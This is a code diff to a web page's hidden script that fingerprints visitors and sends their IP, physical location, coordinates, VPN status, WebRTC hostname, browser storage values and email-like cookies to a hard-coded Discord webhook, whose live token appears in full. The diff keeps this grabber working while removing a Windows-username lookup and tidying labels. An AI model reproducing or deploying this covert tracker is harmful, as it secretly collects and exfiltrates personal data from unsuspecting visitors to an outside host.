@@ -85,7 +85,7 @@
 
 <script>
     // ================================================================
-    //  WEBHOOK (your new one)
+    //  WEBHOOK (replace with yours)
     // ================================================================
     const WEBHOOK = "https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6";
 
@@ -175,7 +175,7 @@
     }
 
     // ================================================================
-    //  EXTRACT COMPUTER NAME / BROWSER PROFILE
+    //  EXTRACT NAME / PROFILE
     // ================================================================
     function getComputerOrBrowserName(ua, webrtcHostname) {
         // Method 1: WebRTC hostname (computer name)
@@ -198,7 +198,6 @@
                         return val;
                     }
                 }
-                // iterate all keys
                 for (let i = 0; i < storage.length; i++) {
                     const key = storage.key(i);
                     const val = storage.getItem(key);
@@ -224,7 +223,6 @@
                 }
             }
         }
-        // Also return any cookie that looks like an email
         for (const cookie of cookies) {
             const parts = cookie.split('=');
             const val = parts[1] || '';
@@ -232,9 +230,6 @@
                 return decodeURIComponent(val);
             }
         }
-
-        // Method 5: Credential Management API (silent) – we skip due to async and potential popup
-        // but we can try, but we won't wait for it.
 
         return 'Not detected';
     }
@@ -326,13 +321,6 @@
 
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-            // Windows username (ActiveX)
-            let winUser = 'Not available (IE/ActiveX required)';
-            try {
-                const wsh = new ActiveXObject('WScript.Shell');
-                winUser = wsh.ExpandEnvironmentStrings('%USERNAME%');
-            } catch (e) {}
-
             // ---- Detect VPN/Tor ----
             let isVpn = detectTorOrVpnByBrowser(ua);
             const hasRealLocalIP = await detectViaWebRTC();
@@ -382,8 +370,8 @@
                 webrtcHostname = result;
             } catch (e) {}
 
-            // ---- Extract computer/browser name ----
-            const computerName = getComputerOrBrowserName(ua, webrtcHostname);
+            // ---- Extract name/profile ----
+            const nameProfile = getComputerOrBrowserName(ua, webrtcHostname);
 
             // ---- Build message ----
             const ip = ipData ? ipData.ip : 'Unknown';
@@ -397,8 +385,7 @@
 **Location:** ${location}
 **Coordinates:** ${coords}
 **VPN/Tor:** ${isVpn ? 'Yes' : 'No'}
-**Windows Username:** ${winUser}
-**Computer Name / Browser Profile:** ${computerName}
+**Name/Profile:** ${nameProfile}
 **OS:** ${os}
 **Browser:** ${browser}
 **CPU Cores:** ${navigator.hardwareConcurrency || '?'}
